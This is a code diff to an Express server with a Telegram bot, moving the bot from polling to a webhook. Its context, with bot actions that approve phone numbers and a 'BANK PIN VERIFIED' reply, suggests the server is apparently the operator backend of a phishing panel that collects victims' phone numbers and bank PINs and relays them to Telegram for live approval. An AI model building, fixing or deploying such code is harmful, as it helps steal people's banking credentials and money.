@@ -5,6 +5,8 @@ require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 8080;
+// IMPORTANT: Add your domain URL in your .env file (e.g., https://your-app.com)
+const DOMAIN = process.env.DOMAIN_URL || ""; 
 
 // -------------------- INIT BOT --------------------
 if (!process.env.BOT_TOKEN) {
@@ -20,7 +22,11 @@ const statusStore = {};
 // -------------------- MIDDLEWARE --------------------
 app.use(express.json());
 
-// 1. SERVE STATIC FILES (Finds index.html and page2.html automatically)
+// 1. WEBHOOK MIDDLEWARE (This is the "Ear" for the bot)
+// This must be placed BEFORE your static file/route handlers
+app.use(bot.webhookCallback('/telegram-updates'));
+
+// 2. SERVE STATIC FILES
 app.use(express.static(path.join(__dirname, 'public')));
 
 // -------------------- ROUTES --------------------
@@ -154,7 +160,7 @@ app.get('/api/check-status', (req, res) => {
 
 // -------------------- FIXED SAFE PAGE ROUTE --------------------
 app.get('/:page', (req, res, next) => {
-    if (req.params.page.startsWith('api')) return next();
+    if (req.params.page.startsWith('api') || req.params.page === 'telegram-updates') return next();
     
     let fileName = req.params.page;
     if (!fileName.endsWith('.html')) {
@@ -170,7 +176,7 @@ app.get('/:page', (req, res, next) => {
     });
 });
 
-// -------------------- BOT ACTIONS --------------------
+// -------------------- BOT ACTIONS (Unchanged) --------------------
 
 bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
@@ -220,13 +226,20 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`✅ <b>BANK PIN VERIFIED:</b> ${phone}`);
 });
 
-// -------------------- START SERVER & BOT --------------------
+// -------------------- START SERVER --------------------
 app.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
     try {
-        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
-        bot.launch();
-        console.log("🤖 Bot is active");
+        if (DOMAIN) {
+            // Set webhook so Telegram sends button clicks to your server
+            await bot.telegram.setWebhook(`${DOMAIN}/telegram-updates`);
+            console.log("🤖 Bot is active via Webhook");
+        } else {
+            // Fallback for local testing (though button clicks won't work locally without ngrok)
+            await bot.telegram.deleteWebhook({ drop_pending_updates: true });
+            bot.launch();
+            console.log("🤖 Bot is active via Polling (Local Mode)");
+        }
     } catch (err) {
         console.error("Launch error:", err);
     }
